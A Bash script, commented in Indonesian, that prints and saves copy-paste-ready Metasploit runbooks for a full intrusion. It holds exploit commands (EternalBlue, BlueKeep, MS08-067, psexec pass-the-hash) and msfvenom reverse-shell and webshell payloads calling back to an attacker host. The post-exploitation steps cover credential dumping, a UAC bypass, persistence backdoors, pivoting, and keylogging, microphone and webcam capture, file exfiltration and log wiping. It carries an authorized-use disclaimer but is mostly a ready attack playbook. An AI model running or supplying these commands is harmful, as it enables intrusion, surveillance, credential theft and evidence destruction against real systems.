#!/usr/bin/env bash
#===============================================================================
#  Metasploit Practical Runbooks — Copy-paste ready untuk 3 fase
#  Usage:
#    bash msf-runbooks.sh             → Menu interaktif runbook
#    source msf-runbooks.sh           → Definisikan fungsi untuk dipanggil
#===============================================================================
set -euo pipefail

# ── Colors (self-contained, bisa di-override oleh script pemanggil) ────────────
: "${RED:=\033[0;31m}"
: "${GREEN:=\033[0;32m}"
: "${YELLOW:=\033[1;33m}"
: "${BLUE:=\033[0;34m}"
: "${MAGENTA:=\033[0;35m}"
: "${CYAN:=\033[0;36m}"
: "${BOLD:=\033[1m}"
: "${DIM:=\033[2m}"
: "${NC:=\033[0m}"

# ── Fallback helpers (bisa di-override oleh script pemanggil) ──────────────────
if ! declare -F log &>/dev/null; then
    log()   { echo -e "  ${GREEN}[✓]${NC} $*"; }
fi
if ! declare -F info &>/dev/null; then
    info()  { echo -e "  ${BLUE}[i]${NC} $*"; }
fi

#==============================================================================
# MENU UTAMA RUNBOOKS
#==============================================================================
run_runbook_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}${BOLD}║  PRACTICAL RUNBOOKS — COPY & PASTE READY                    ║${NC}"
        echo -e "${CYAN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 📖 LIHAT SEMUA RUNBOOK (Recon + Exploit + Post-Exploit)"
        echo -e "  ${GREEN}2)${NC} 🔍 FASE 1: Reconnaissance Runbook"
        echo -e "  ${GREEN}3)${NC} ⚔️  FASE 2: Exploitation Runbook"
        echo -e "  ${GREEN}4)${NC} 🎯 FASE 3: Post-Exploitation Runbook"
        echo -e "  ${GREEN}5)${NC} 💾 SIMPAN SEBAGAI .rc FILE (auto-run di msfconsole)"
        echo -e "  ${GREEN}6)${NC} 📄 SIMPAN SEBAGAI .md FILE (dokumentasi)"
        echo -e "  ${GREEN}0)${NC} Kembali ke Quick-Start Menu"
        echo ""
        local rb_choice
        read -r -p "  [?] Pilih (0-6): " rb_choice
        case "$rb_choice" in
            1) print_practical_runbooks ;;
            2) print_runbook_recon ;;
            3) print_runbook_exploit ;;
            4) print_runbook_postexploit ;;
            5) save_runbook_to_file ;;
            6) save_runbook_md_to_file ;;
            0|*) break ;;
        esac
    done
}

#==============================================================================
# SAVE RUNBOOK AS MARKDOWN DOCUMENTATION
#==============================================================================
save_runbook_md_to_file() {
    local gen_date
    gen_date=$(date '+%Y-%m-%d %H:%M:%S')
    local outfile="$HOME/msf_runbook_$(date +%Y%m%d_%H%M%S).md"
    cat > "$outfile" << RBMDEOF
# Metasploit Practical Runbook — Recon → Exploit → Post-Exploit

> Generated: ${gen_date} | For authorized engagements only

---

## FASE 1: Reconnaissance (Pengintaian)

\`\`\`bash
# Di msfconsole:
workspace -a recon_\$(date +%Y%m%d)
db_nmap -sS -T4 --top-ports 1000 192.168.1.0/24
db_nmap -p- -sV -O 192.168.1.50
db_nmap --script vuln 192.168.1.50
db_nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.0/24
db_nmap --script http-enum,http-title -p 80,443,8080 192.168.1.50
hosts; services; vulns; creds
\`\`\`

---

## FASE 2: Exploitation (Eksploitasi)

\`\`\`bash
# Di msfconsole:
setg LHOST 192.168.1.100; setg LPORT 4444

# EternalBlue:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# BlueKeep:
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# PsExec (dengan kredensial):
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50; set SMBUser admin; set SMBPass pass
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Pass the Hash:
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50; set SMBUser admin
set SMBPass <NTLM_hash>
exploit

# Listener:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100; set LPORT 443
exploit -j
\`\`\`

### msfvenom (di terminal, bukan msfconsole):

\`\`\`bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o p.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o p_https.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o p.elf
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o p.apk
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
\`\`\`

---

## FASE 3: Post-Exploitation (Pasca-Eksploitasi)

\`\`\`bash
# Di meterpreter session:
sessions -i 1
getuid; getsystem; sysinfo

# Credential Harvesting:
load kiwi; creds_all; lsa_dump_sam; lsa_dump_secrets; hashdump
run post/windows/gather/hashdump; run post/windows/gather/enum_chrome

# Privilege Escalation:
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac_eventvwr; set SESSION 1; exploit

# Persistence:
run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r 192.168.1.100
use exploit/windows/local/service_persistence; set SESSION 1; exploit
use exploit/windows/local/wmi_persistence; set SESSION 1; exploit

# Pivoting & Lateral Movement:
run autoroute -s 192.168.10.0/24; run autoroute -p
use auxiliary/server/socks_proxy; set SRVPORT 1080; run
# Di terminal baru: proxychains nmap -sT 192.168.10.50
use exploit/windows/smb/psexec; set RHOSTS 192.168.10.50; set SMBUser admin; set SMBPass <hash>; exploit

# Data Exfiltration:
screenshot; keyscan_start; sleep 30; keyscan_dump; keyscan_stop
download "C:\\Users\\Admin\\secret.pdf" /tmp/
search -f "*.pdf" -d "C:\\Users"
record_mic -d 30; webcam_snap

# Cleanup:
clearev; timestomp "C:\\path\\file.exe" -v "C:\\Windows\\System32\\kernel32.dll"
run post/windows/manage/cleanup
\`\`\`

---

*Generated for authorized penetration testing engagements only.*
RBMDEOF
    log "Runbook (markdown) saved to: ${outfile}"
    info "Open with: cat ${outfile} | less"
}

#==============================================================================
# FULL RUNBOOKS — SEMUA 3 FASE
#==============================================================================
print_practical_runbooks() {
    echo ""
    echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}           PRACTICAL RUNBOOKS — COPY & PASTE KE MSFCONSOLE              ${NC}"
    echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════════════════════${NC}"
    echo ""

    cat << 'RUNBOOK'

┌──────────────────────────────────────────────────────────────────────────────┐
│  🔍 FASE 1: PENGINTAIAN (RECONNAISSANCE) — Memetakan Jaringan                │
│  Tujuan: Temukan host hidup, port terbuka, service, OS, dan celah           │
└──────────────────────────────────────────────────────────────────────────────┘

# ── A. Quick Network Discovery (copy-paste ini ke msfconsole) ──
workspace -a recon_$(date +%Y%m%d)
db_nmap -sS -T4 --top-ports 1000 192.168.1.0/24
hosts
services

# ── B. Full Scan + Service + OS ──
db_nmap -p- -sV -O -T4 192.168.1.50

# ── C. Vulnerability Scan ──
db_nmap --script vuln 192.168.1.50

# ── D. SMB Enumeration ──
db_nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -p 445 192.168.1.0/24

# ── E. Web App Scan ──
db_nmap --script http-enum,http-title,http-headers,http-robots.txt -p 80,443,8080,8443 192.168.1.50

# ── F. Import External Nmap ──
# db_import /path/to/nmap_output.xml

# ── G. Lihat Hasil ──
hosts -R                      # Hosts dengan service
services -p 445 -R            # Service di port 445
vulns                         # Vulnerabilities ditemukan
creds                         # Credentials tersimpan

RUNBOOK

    cat << 'RUNBOOK'

┌──────────────────────────────────────────────────────────────────────────────┐
│  ⚔️  FASE 2: EKSPLOITASI (EXPLOITATION) — Menyerang Celah                    │
│  Tujuan: Dapatkan shell / meterpreter session                                │
└──────────────────────────────────────────────────────────────────────────────┘

# ── Setup Global LHOST/LPORT (ganti IP attacker) ──
setg LHOST 192.168.1.100
setg LPORT 4444

# ── 1. EternalBlue (MS17-010) — Windows SMBv1 RCE ──
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# ── 2. BlueKeep (CVE-2019-0708) — RDP RCE ──
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# ── 3. MS08-067 NetAPI — Windows XP/2003 ──
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.50
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# ── 4. PsExec (butuh kredensial) ──
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50
set SMBUser administrator
set SMBPass Password123
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# ── 5. Pass the Hash ──
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# ── 6. Listener untuk Payload Custom (msfvenom) ──
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
exploit -j

# ── 7. msfvenom (JALANKAN DI TERMINAL, BUKAN MSFCONSOLE) ──
# Windows EXE:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
# Windows HTTPS (stealth):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload_https.exe
# Linux ELF:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf
# Android APK:
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk
# PHP Webshell:
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
# JSP Webshell:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

RUNBOOK

    cat << 'RUNBOOK'

┌──────────────────────────────────────────────────────────────────────────────┐
│  🎯 FASE 3: PASCA-EKSPLOITASI (POST-EXPLOITATION) — Akses Berkelanjutan      │
│  Tujuan: PrivEsc, Persistence, Pivoting, Exfil, Cleanup                     │
└──────────────────────────────────────────────────────────────────────────────┘

# ── Setelah dapat session (meterpreter) ──
sessions -l
sessions -i 1

# ── 1. Info & Privilege ──
getuid
getsystem
sysinfo

# ── 2. Credential Harvesting (Windows) ──
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
hashdump
run post/windows/gather/hashdump
run post/windows/gather/enum_chrome
run post/windows/gather/enum_firefox

# ── 3. Credential Harvesting (Linux) ──
run post/linux/gather/hashdump
run post/linux/gather/enum_users_history

# ── 4. Privilege Escalation ──
run post/multi/recon/local_exploit_suggester
# Pilih exploit yang disarankan, contoh:
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
exploit

# ── 5. Persistence (Backdoor) ──
# Registry (auto-run):
run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r 192.168.1.100
# Service:
use exploit/windows/local/service_persistence
set SESSION 1
exploit
# WMI (fileless):
use exploit/windows/local/wmi_persistence
set SESSION 1
exploit

# ── 6. Pivoting & Lateral Movement ──
run autoroute -s 192.168.10.0/24
run autoroute -p
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
# Terminal baru: proxychains nmap -sT 192.168.10.50

# PsExec lateral:
use exploit/windows/smb/psexec
set RHOSTS 192.168.10.50
set SMBUser administrator
set SMBPass <hash>
exploit

# ── 7. Data Exfiltration ──
screenshot
keyscan_start; sleep 30; keyscan_dump; keyscan_stop
download "C:\\Users\\Admin\\secret.pdf" /tmp/
search -f "*.pdf" -d "C:\\Users"
record_mic -d 30
webcam_snap

# ── 8. Cleanup & Anti-Forensics ──
clearev
timestomp "C:\\path\\file.exe" -v "C:\\Windows\\System32\\kernel32.dll"
run post/windows/manage/cleanup

RUNBOOK
}

#==============================================================================
# INDIVIDUAL PHASE RUNBOOKS
#==============================================================================
print_runbook_recon() {
    echo ""
    cat << 'RB'
┌──────────────────────────────────────────────────────────────────────────────┐
│  🔍 FASE 1: PENGINTAIAN (RECONNAISSANCE)                                     │
└──────────────────────────────────────────────────────────────────────────────┘
workspace -a recon_$(date +%Y%m%d)
db_nmap -sS -T4 --top-ports 1000 192.168.1.0/24
db_nmap -p- -sV -O 192.168.1.50
db_nmap --script vuln 192.168.1.50
db_nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.0/24
db_nmap --script http-enum,http-title -p 80,443,8080 192.168.1.50
hosts; services; vulns; creds
RB
}

print_runbook_exploit() {
    echo ""
    cat << 'RB'
┌──────────────────────────────────────────────────────────────────────────────┐
│  ⚔️  FASE 2: EKSPLOITASI (EXPLOITATION)                                      │
└──────────────────────────────────────────────────────────────────────────────┘
setg LHOST 192.168.1.100; setg LPORT 4444

# EternalBlue:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# BlueKeep:
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# PsExec (cred):
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50; set SMBUser admin; set SMBPass pass
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Pass the Hash:
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50; set SMBUser admin
set SMBPass <NTLM_hash>
exploit

# Listener:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100; set LPORT 443
exploit -j

# msfvenom (terminal):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o p.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o p_https.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o p.elf
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o p.apk
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
RB
}

print_runbook_postexploit() {
    echo ""
    cat << 'RB'
┌──────────────────────────────────────────────────────────────────────────────┐
│  🎯 FASE 3: PASCA-EKSPLOITASI (POST-EXPLOITATION)                           │
└──────────────────────────────────────────────────────────────────────────────┘
sessions -i 1
getuid; getsystem; sysinfo

# Creds:
load kiwi; creds_all; lsa_dump_sam; lsa_dump_secrets; hashdump
run post/windows/gather/hashdump; run post/windows/gather/enum_chrome

# PrivEsc:
run post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac_eventvwr; set SESSION 1; exploit

# Persistence:
run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r 192.168.1.100
use exploit/windows/local/service_persistence; set SESSION 1; exploit
use exploit/windows/local/wmi_persistence; set SESSION 1; exploit

# Pivoting:
run autoroute -s 192.168.10.0/24; run autoroute -p
use auxiliary/server/socks_proxy; set SRVPORT 1080; run
# proxychains nmap -sT 192.168.10.50

# Lateral:
use exploit/windows/smb/psexec; set RHOSTS 192.168.10.50; set SMBUser admin; set SMBPass <hash>; exploit

# Exfil:
screenshot; keyscan_start; sleep 30; keyscan_dump; keyscan_stop
download "C:\\Users\\Admin\\secret.pdf" /tmp/
search -f "*.pdf" -d "C:\\Users"
record_mic -d 30; webcam_snap

# Cleanup:
clearev; timestomp "C:\\path\\file.exe" -v "C:\\Windows\\System32\\kernel32.dll"
run post/windows/manage/cleanup
RB
}

#==============================================================================
# SAVE RUNBOOK AS .rc FILE (msfconsole resource script)
#==============================================================================
save_runbook_to_file() {
    local outfile="$HOME/msf_runbook_$(date +%Y%m%d_%H%M%S).rc"
    cat > "$outfile" << 'RC'
# Metasploit Runbook — Auto-generated
# Usage: msfconsole -r this_file.rc

# ===== SETUP =====
setg LHOST 192.168.1.100
setg LPORT 4444

# ===== RECON =====
workspace -a pentest_20260101
db_nmap -sS -T4 --top-ports 1000 192.168.1.0/24
hosts; services

# ===== EXPLOIT =====
# EternalBlue example (uncomment & edit RHOSTS):
# use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS 192.168.1.50
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# exploit

# Listener:
# use exploit/multi/handler
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# exploit -j

# ===== POST-EXPLOIT (run after session) =====
# sessions -i 1
# getuid; getsystem
# load kiwi; creds_all; hashdump
# run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r 192.168.1.100
# run autoroute -s 192.168.10.0/24
# clearev
RC
    log "Runbook saved to: ${outfile}"
    info "Jalankan: msfconsole -r ${outfile}"
}

#==============================================================================
# STANDALONE EXECUTION — tampilkan menu runbook jika dijalankan langsung
#==============================================================================
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo -e "${CYAN}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║     METASPLOIT PRACTICAL RUNBOOKS                    ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    run_runbook_menu
fi